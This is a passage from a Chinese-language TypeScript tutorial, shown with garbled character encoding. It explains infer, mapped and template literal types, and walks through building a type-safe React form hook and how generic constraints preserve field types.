<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Unwrap</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : T;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">Unwrap</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;;  <span class="hljs-comment">// string</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">Unwrap</span>&lt;<span class="hljs-built_in">number</span>&gt;;           <span class="hljs-comment">// number</span>
</code></pre>
<p>æ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<ol>
<li><code>T extends Promise&lt;infer U&gt;</code> â€” T æ˜¯ä¸æ˜¯ <code>Promise&lt;æŸä¸ªç±»å‹&gt;</code>ï¼Ÿ</li>
<li><code>infer U</code> â€” å¦‚æœæ˜¯ï¼ŒæŠŠé‚£ä¸ªç±»å‹æ•è·å‡ºæ¥å« <code>U</code></li>
<li><code>? U : T</code> â€” æ¡ä»¶æˆç«‹è¿”å› <code>U</code>ï¼Œå¦åˆ™è¿”å› <code>T</code></li>
</ol>
<h4 data-id="heading-20">ç¤ºä¾‹ï¼šæå–å‡½æ•°è¿”å›å€¼ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Fn</span> = <span class="hljs-function">(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) =&gt;</span> { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-title class_">Fn</span>&gt;;  <span class="hljs-comment">// { name: string; age: number }</span>
</code></pre>
<h4 data-id="heading-21">ç¤ºä¾‹ï¼š<code>infer</code> é…åˆæ¨¡æ¿å­—é¢é‡æå–å­—ç¬¦ä¸²</h4>
<p><code>infer</code> ä¸ä»…èƒ½æå–æ³›å‹å‚æ•°ï¼Œè¿˜èƒ½ä»å­—ç¬¦ä¸²å­—é¢é‡ç±»å‹ä¸­æå–éƒ¨åˆ†å†…å®¹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä» 'GET /api/user/:id' ä¸­æå–æ–¹æ³•</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractMethod</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer M}</span> <span class="hljs-subst">${<span class="hljs-built_in">string</span>}</span>`</span> ? M : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Method</span> = <span class="hljs-title class_">ExtractMethod</span>&lt;<span class="hljs-string">'GET /api/user/:id'</span>&gt;;  <span class="hljs-comment">// 'GET'</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Method2</span> = <span class="hljs-title class_">ExtractMethod</span>&lt;<span class="hljs-string">'POST /api/login'</span>&gt;;   <span class="hljs-comment">// 'POST'</span>

<span class="hljs-comment">// ä» 'GET /api/user/:id' ä¸­æå–è·¯å¾„</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractPath</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-built_in">string</span>}</span> <span class="hljs-subst">${infer P}</span>`</span> ? P : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Path</span> = <span class="hljs-title class_">ExtractPath</span>&lt;<span class="hljs-string">'GET /api/user/:id'</span>&gt;;  <span class="hljs-comment">// '/api/user/:id'</span>
</code></pre>
<p>æ‰§è¡Œè¿‡ç¨‹ï¼ˆä»¥ <code>ExtractMethod</code> ä¸ºä¾‹ï¼‰ï¼š</p>
<ol>
<li><code>T = 'GET /api/user/:id'</code></li>
<li>æ¨¡å¼ <code>${infer M} ${string}</code> è¡¨ç¤ºï¼š<code>M</code> + ç©ºæ ¼ + ä»»æ„å­—ç¬¦ä¸²</li>
<li>TS å°è¯•åŒ¹é…ï¼Œå‘ç° <code>M = 'GET'</code>ï¼Œåé¢æ˜¯ <code>' /api/user/:id'</code></li>
<li>åŒ¹é…æˆåŠŸï¼Œè¿”å› <code>M</code>ï¼Œå³ <code>'GET'</code></li>
</ol>
<p>è¿™åœ¨æ„å»ºç±»å‹å®‰å…¨çš„è·¯ç”±ã€API å®¢æˆ·ç«¯æ—¶éå¸¸æœ‰ç”¨ã€‚</p>
<h3 data-id="heading-22">æ˜ å°„ç±»å‹ï¼šæ‰¹é‡å˜æ¢å¯¹è±¡ç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = { [K <span class="hljs-keyword">in</span> keyof T]?: T[K] };
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Readonly</span>&lt;T&gt; = { <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof T]: T[K] };
</code></pre>
<h3 data-id="heading-23">æ¨¡æ¿å­—é¢é‡ç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">EventName</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-string">`on<span class="hljs-subst">${Capitalize&lt;T&gt;}</span>`</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ClickEvent</span> = <span class="hljs-title class_">EventName</span>&lt;<span class="hljs-string">'click'</span>&gt;;  <span class="hljs-comment">// "onClick"</span>
</code></pre>
<hr/>
<h2 data-id="heading-24">äº”ã€å®æˆ˜æ¡ˆä¾‹ï¼šç±»å‹å®‰å…¨çš„è¡¨å• Hook</h2>
<blockquote>
<p>æœ¬æ¡ˆä¾‹å®Œæ•´å±•ç¤ºä¸¤ä¸ªæ ¸å¿ƒç†å¿µï¼š</p>
<ul>
<li><strong>ç±»å‹æ¨æ–­æŠŠè¿è¡Œæ—¶é”™è¯¯å˜ç¼–è¯‘æ—¶é”™è¯¯</strong>ï¼šå­—æ®µåæ‹¼é”™ã€å€¼ç±»å‹ä¸å¯¹ï¼Œç¼–è¯‘æ—¶å°±æŠ¥é”™</li>
<li><strong>æ³›å‹è®©ç±»å‹"æµåŠ¨"</strong>ï¼šåˆå§‹å€¼çš„ç±»å‹ä¿¡æ¯ä¸€è·¯æµåŠ¨åˆ° <code>setField</code>ï¼Œä¸ä¼šä¸¢å¤±</li>
</ul>
</blockquote>
<h3 data-id="heading-25">éœ€æ±‚</h3>
<ul>
<li>ä¼ å…¥åˆå§‹å€¼ï¼Œè‡ªåŠ¨æ¨å¯¼è¡¨å•å­—æ®µç±»å‹</li>
<li><code>values</code>ã€<code>errors</code>ã€<code>onChange</code> éƒ½è¦ç±»å‹å®‰å…¨</li>
<li>å­—æ®µåå†™é”™è¦æŠ¥é”™ï¼Œå€¼ç±»å‹ä¸å¯¹è¦æŠ¥é”™</li>
</ul>
<h3 data-id="heading-26">æ²¡æœ‰ç±»å‹æ¨å¯¼çš„ç—›è‹¦</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ æ‰‹åŠ¨æŒ‡å®šç±»å‹ï¼Œå†™ä¸¤éï¼Œå®¹æ˜“ä¸åŒæ­¥</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">FormValues</span> {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">const</span> { values, setField } = useForm&lt;<span class="hljs-title class_">FormValues</span>&gt;({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>
});

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'test'</span>);  <span class="hljs-comment">// æ‹¼å†™é”™è¯¯ï¼Œè¿è¡Œæ—¶æ‰å‘ç°</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'18'</span>);         <span class="hljs-comment">// ç±»å‹é”™äº†ï¼Œstring ç»™äº† number å­—æ®µ</span>
</code></pre>
<h3 data-id="heading-27">å®ç°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-keyword">const</span> [values, setValues] = useState&lt;T&gt;(initialValues);
  <span class="hljs-keyword">const</span> [errors, setErrors] = useState&lt;<span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Record</span>&lt;keyof T, <span class="hljs-built_in">string</span>&gt;&gt;&gt;({});

  <span class="hljs-comment">// K extends keyof Tï¼šå­—æ®µåå¿…é¡»æ˜¯ T çš„ key</span>
  <span class="hljs-comment">// T[K]ï¼šå€¼ç±»å‹è‡ªåŠ¨è·Ÿç€å­—æ®µèµ°</span>
  <span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K]) {
    <span class="hljs-title function_">setValues</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [field]: value }));
  }

  <span class="hljs-keyword">function</span> setError&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>) {
    <span class="hljs-title function_">setErrors</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [field]: message }));
  }

  <span class="hljs-keyword">return</span> { values, errors, setField, setError };
}
</code></pre>
<h3 data-id="heading-28">ä½¿ç”¨æ•ˆæœ</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> { values, setField } = <span class="hljs-title function_">useForm</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span>,
});

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'john'</span>);     <span class="hljs-comment">// âœ… </span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);              <span class="hljs-comment">// âœ…</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);     <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šå­—æ®µåä¸å­˜åœ¨</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);            <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šæœŸæœ› numberï¼Œç»™äº† string</span>
</code></pre>
<h3 data-id="heading-29">ç¼–è¾‘å™¨æ™ºèƒ½æç¤º</h3>
<p>ç±»å‹æ¨æ–­ä¸ä»…èƒ½æŠ¥é”™ï¼Œè¿˜èƒ½æä¾›æ™ºèƒ½æç¤ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'|'</span>)  <span class="hljs-comment">// å…‰æ ‡åœ¨è¿™é‡Œæ—¶ï¼Œç¼–è¾‘å™¨è‡ªåŠ¨å¼¹å‡ºè¡¥å…¨åˆ—è¡¨ï¼š</span>
               <span class="hljs-comment">// - username</span>
               <span class="hljs-comment">// - age</span>
               <span class="hljs-comment">// - isAdmin</span>

values.|       <span class="hljs-comment">// å…‰æ ‡åœ¨è¿™é‡Œæ—¶ï¼Œç¼–è¾‘å™¨è‡ªåŠ¨æç¤ºæ‰€æœ‰å¯ç”¨å­—æ®µå’Œç±»å‹ï¼š</span>
               <span class="hljs-comment">// - username: string</span>
               <span class="hljs-comment">// - age: number</span>
               <span class="hljs-comment">// - isAdmin: boolean</span>
</code></pre>
<p>è¿™æ˜¯å› ä¸º TS æ¨æ–­å‡ºäº†å…·ä½“ç±»å‹ï¼Œç¼–è¾‘å™¨ï¼ˆé€šè¿‡ TypeScript Language Serverï¼‰å°±èƒ½æä¾›ç²¾ç¡®çš„è¡¥å…¨å’Œç±»å‹ä¿¡æ¯ã€‚å¦‚æœç±»å‹ä¿¡æ¯ä¸¢å¤±ï¼ˆæ¯”å¦‚å˜æˆ <code>Record&lt;string, unknown&gt;</code>ï¼‰ï¼Œè¿™äº›æç¤ºå°±æ²¡äº†ã€‚</p>
<h3 data-id="heading-30">ç±»å‹æ¨æ–­çš„å®Œæ•´æ‰§è¡Œè¿‡ç¨‹</h3>
<h4 data-id="heading-31">ç¬¬ä¸€æ­¥ï¼šè°ƒç”¨ useFormï¼Œæ¨æ–­æ³›å‹ T</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> { values, setField } = <span class="hljs-title function_">useForm</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span>,
});
</code></pre>
<p>TS çœ‹åˆ°ä½ ä¼ å…¥çš„å¯¹è±¡å­—é¢é‡ï¼Œè‡ªåŠ¨æ¨æ–­å‡ºæ³›å‹ <code>T</code> çš„å…·ä½“ç±»å‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">T = {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-built_in">boolean</span>;
}
</code></pre>
<p>æ­¤æ—¶å‡½æ•°ç­¾åç›¸å½“äºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useForm</span>(<span class="hljs-params">initialValues: { username: <span class="hljs-built_in">string</span>; age: <span class="hljs-built_in">number</span>; isAdmin: <span class="hljs-built_in">boolean</span> }</span>)
</code></pre>
<h4 data-id="heading-32">ç¬¬äºŒæ­¥ï¼škeyof T ç”Ÿæˆå­—æ®µåè”åˆç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript">keyof T = <span class="hljs-string">'username'</span> | <span class="hljs-string">'age'</span> | <span class="hljs-string">'isAdmin'</span>
</code></pre>
<p>è¿™æ„å‘³ç€æ‰€æœ‰ç”¨åˆ° <code>keyof T</code> çš„åœ°æ–¹ï¼Œåªèƒ½æ˜¯è¿™ä¸‰ä¸ªå­—ç¬¦ä¸²ä¹‹ä¸€ã€‚</p>
<h4 data-id="heading-33">ç¬¬ä¸‰æ­¥ï¼šsetField è°ƒç”¨æ—¶çš„æ¨æ–­</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K])
</code></pre>
<p>å½“ä½ è°ƒç”¨ <code>setField('age', 25)</code> æ—¶ï¼š</p>
<ol>
<li>TS çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <code>'age'</code></li>
<li>æ¨æ–­å‡º <code>K = 'age'</code></li>
<li>è®¡ç®— <code>T[K]</code> = <code>T['age']</code> = <code>number</code></li>
<li>æ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•° <code>value</code> å¿…é¡»æ˜¯ <code>number</code></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);      <span class="hljs-comment">// âœ… K='age', T[K]=number, 25 æ˜¯ number</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);    <span class="hljs-comment">// âŒ K='age', T[K]=number, '25' æ˜¯ stringï¼Œç±»å‹ä¸åŒ¹é…</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'john'</span>); <span class="hljs-comment">// âœ… K='username', T[K]=string</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'isAdmin'</span>, <span class="hljs-literal">true</span>);    <span class="hljs-comment">// âœ… K='isAdmin', T[K]=boolean</span>
</code></pre>
<h4 data-id="heading-34">ç¬¬å››æ­¥ï¼šé”™è¯¯å­—æ®µåçš„æ‹¦æˆª</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯</span>
</code></pre>
<p>TS æ£€æŸ¥ <code>'usernmae'</code> æ˜¯å¦å±äº <code>keyof T</code>ï¼ˆå³ <code>'username' | 'age' | 'isAdmin'</code>ï¼‰ï¼Œå‘ç°ä¸å±äºï¼Œç›´æ¥æŠ¥é”™ã€‚</p>
<h4 data-id="heading-35">å®Œæ•´æ¨æ–­æµç¨‹å›¾</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span> })
    â”‚
    â–¼
T è¢«æ¨æ–­ä¸º { username: <span class="hljs-keyword">string</span>; age: number; isAdmin: <span class="hljs-keyword">boolean</span> }
    â”‚
    â–¼
keyof T = <span class="hljs-string">'username'</span> | <span class="hljs-string">'age'</span> | <span class="hljs-string">'isAdmin'</span>
    â”‚
    â–¼
<span class="hljs-title function_ invoke__">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>) è°ƒç”¨æ—¶ï¼š
    â”‚
    â”œâ”€ K è¢«æ¨æ–­ä¸º <span class="hljs-string">'age'</span>ï¼ˆå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <span class="hljs-string">'age'</span>ï¼‰
    â”‚
    â”œâ”€ T[K] = T[<span class="hljs-string">'age'</span>] = number
    â”‚
    â””â”€ æ£€æŸ¥ <span class="hljs-number">25</span> æ˜¯å¦ç¬¦åˆ number âœ…
</code></pre>
<h4 data-id="heading-36">ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡æœ‰æ•ˆ</h4>
<p>å…³é”®åœ¨äº <strong>æ³›å‹ K æ˜¯åœ¨è°ƒç”¨æ—¶æ‰ç¡®å®šçš„</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K])
<span class="hljs-comment">//              â†‘ æ¯æ¬¡è°ƒç”¨éƒ½ä¼šæ¨æ–­å‡ºå…·ä½“çš„ K</span>
</code></pre>
<ul>
<li>è°ƒç”¨ <code>setField('age', ...)</code> æ—¶ï¼ŒK = 'age'</li>
<li>è°ƒç”¨ <code>setField('username', ...)</code> æ—¶ï¼ŒK = 'username'</li>
</ul>
<p>ç„¶å <code>T[K]</code> ä¼šæ ¹æ® K çš„å€¼åŠ¨æ€è®¡ç®—å‡ºå¯¹åº”çš„ç±»å‹ï¼Œå®ç°äº†"å­—æ®µåå’Œå€¼ç±»å‹çš„ç»‘å®š"ã€‚</p>
<h3 data-id="heading-37">æ·±å…¥ç†è§£ï¼šæ³›å‹å˜é‡ä¸ extends çº¦æŸ</h3>
<h4 data-id="heading-38">æ³›å‹å˜é‡çš„æœ¬è´¨</h4>
<p>æ³›å‹å˜é‡ <code>T</code> æ˜¯ä¸€ä¸ª<strong>ç±»å‹å ä½ç¬¦</strong>ï¼Œå®ƒçš„å…·ä½“å€¼ç”±è°ƒç”¨æ—¶ä¼ å…¥çš„å‚æ•°<strong>åæ¨ç¡®å®š</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T)
<span class="hljs-comment">//              â†‘ T æ˜¯å ä½ç¬¦ï¼Œè°ƒç”¨æ—¶æ‰çŸ¥é“å…·ä½“æ˜¯ä»€ä¹ˆç±»å‹</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// è°ƒç”¨æ—¶ï¼ŒTS æ ¹æ®å‚æ•°åæ¨ T çš„å€¼</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> })
<span class="hljs-comment">//      â””â”€ å‚æ•°ç±»å‹æ˜¯ { username: string; age: number }</span>
<span class="hljs-comment">//         æ‰€ä»¥ T = { username: string; age: number }</span>
</code></pre>
<h4 data-id="heading-39"><code>extends</code> çº¦æŸçš„ä½œç”¨</h4>
<p><code>T extends Record&lt;string, unknown&gt;</code> çš„æ„æ€æ˜¯ï¼š<strong>T å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼Œä½†å¿…é¡»æ»¡è¶³ <code>Record&lt;string, unknown&gt;</code> çš„çº¦æŸ</strong>ã€‚</p>
<p><code>Record&lt;string, unknown&gt;</code> è¡¨ç¤º"key æ˜¯ stringï¼Œvalue æ˜¯ä»»æ„ç±»å‹çš„å¯¹è±¡"ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ™®é€šå¯¹è±¡ã€‚</p>
<h4 data-id="heading-40">å¦‚æœä¼ å…¥ä¸ç¬¦åˆçº¦æŸçš„ç±»å‹ä¼šæ€æ ·ï¼Ÿ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… ç¬¦åˆçº¦æŸï¼šæ™®é€šå¯¹è±¡</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// âŒ ä¸ç¬¦åˆçº¦æŸï¼šæ•°ç»„ä¸æ˜¯ Record&lt;string, unknown&gt;</span>
<span class="hljs-title function_">useForm</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼šArgument of type 'number[]' is not assignable to parameter of type 'Record&lt;string, unknown&gt;'</span>

<span class="hljs-comment">// âŒ ä¸ç¬¦åˆçº¦æŸï¼šåŸå§‹ç±»å‹</span>
<span class="hljs-title function_">useForm</span>(<span class="hljs-string">'hello'</span>);
<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼šArgument of type 'string' is not assignable to parameter of type 'Record&lt;string, unknown&gt;'</span>

<span class="hljs-comment">// âŒ ä¸ç¬¦åˆçº¦æŸï¼šnull</span>
<span class="hljs-title function_">useForm</span>(<span class="hljs-literal">null</span>);
<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯</span>
</code></pre>
<h4 data-id="heading-41">extends çº¦æŸ vs ç›´æ¥æŒ‡å®šç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼ä¸€ï¼šç›´æ¥æŒ‡å®šå‚æ•°ç±»å‹ï¼ˆä¸çµæ´»ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useForm</span>(<span class="hljs-params">initialValues: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>)

<span class="hljs-comment">// æ–¹å¼äºŒï¼šæ³›å‹ + extends çº¦æŸï¼ˆçµæ´»ä¸”å®‰å…¨ï¼‰</span>
<span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T)
</code></pre>
<p><strong>æ–¹å¼ä¸€çš„é—®é¢˜ï¼šç±»å‹ä¿¡æ¯ä¸¢å¤±</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç›´æ¥æŒ‡å®šç±»å‹çš„å®ç°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useFormBad</span>(<span class="hljs-params">initialValues: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">const</span> [values, setValues] = <span class="hljs-title function_">useState</span>(initialValues);
  <span class="hljs-keyword">return</span> { values };
}

<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormBad</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// values çš„ç±»å‹æ˜¯ Record&lt;string, unknown&gt;</span>
<span class="hljs-comment">// TS åªçŸ¥é“å®ƒæ˜¯"æŸä¸ªå¯¹è±¡"ï¼Œä¸çŸ¥é“å…·ä½“æœ‰å“ªäº›å­—æ®µ</span>

values.<span class="hljs-property">username</span>;  <span class="hljs-comment">// ç±»å‹æ˜¯ unknownï¼Œä¸æ˜¯ string</span>
values.<span class="hljs-property">age</span>;       <span class="hljs-comment">// ç±»å‹æ˜¯ unknownï¼Œä¸æ˜¯ number</span>
values.<span class="hljs-property">foo</span>;       <span class="hljs-comment">// âœ… ä¸æŠ¥é”™ï¼TS è®¤ä¸ºä»»ä½• string key éƒ½å¯èƒ½å­˜åœ¨</span>

<span class="hljs-comment">// ä½¿ç”¨æ—¶å¿…é¡»æ‰‹åŠ¨æ–­è¨€ï¼Œå¾ˆéº»çƒ¦ä¸”ä¸å®‰å…¨</span>
<span class="hljs-keyword">const</span> name = values.<span class="hljs-property">username</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
</code></pre>
<p><strong>æ–¹å¼äºŒçš„ä¼˜åŠ¿ï¼šä¿ç•™å…·ä½“ç±»å‹</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ³›å‹ + extends çº¦æŸçš„å®ç°</span>
<span class="hljs-keyword">function</span> useFormGood&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-keyword">const</span> [values, setValues] = useState&lt;T&gt;(initialValues);
  <span class="hljs-keyword">return</span> { values };
}

<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormGood</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// values çš„ç±»å‹æ˜¯ { username: string; age: number }</span>
<span class="hljs-comment">// TS çŸ¥é“å…·ä½“æœ‰å“ªäº›å­—æ®µï¼Œæ¯ä¸ªå­—æ®µæ˜¯ä»€ä¹ˆç±»å‹</span>

values.<span class="hljs-property">username</span>;  <span class="hljs-comment">// ç±»å‹æ˜¯ string âœ…</span>
values.<span class="hljs-property">age</span>;       <span class="hljs-comment">// ç±»å‹æ˜¯ number âœ…</span>
values.<span class="hljs-property">foo</span>;       <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šProperty 'foo' does not exist</span>
</code></pre>
<p><strong>å¯¹æ¯”æ€»ç»“</strong></p>



































<table><thead><tr><th/><th>ç›´æ¥æŒ‡å®šç±»å‹</th><th>æ³›å‹ + extends</th></tr></thead><tbody><tr><td>å‚æ•°ç±»å‹</td><td><code>Record&lt;string, unknown&gt;</code></td><td><code>T</code>ï¼ˆå…·ä½“ç±»å‹ï¼‰</td></tr><tr><td>è¿”å›å€¼ç±»å‹</td><td><code>Record&lt;string, unknown&gt;</code></td><td><code>T</code>ï¼ˆå…·ä½“ç±»å‹ï¼‰</td></tr><tr><td>å­—æ®µè®¿é—®</td><td>ä»»æ„å­—æ®µéƒ½ä¸æŠ¥é”™</td><td>åªèƒ½è®¿é—®å­˜åœ¨çš„å­—æ®µ</td></tr><tr><td>å­—æ®µç±»å‹</td><td>å…¨æ˜¯ <code>unknown</code></td><td>ä¿ç•™åŸå§‹ç±»å‹</td></tr><tr><td>IDE æç¤º</td><td>æ— </td><td>æœ‰å®Œæ•´çš„å­—æ®µè¡¥å…¨</td></tr></tbody></table>
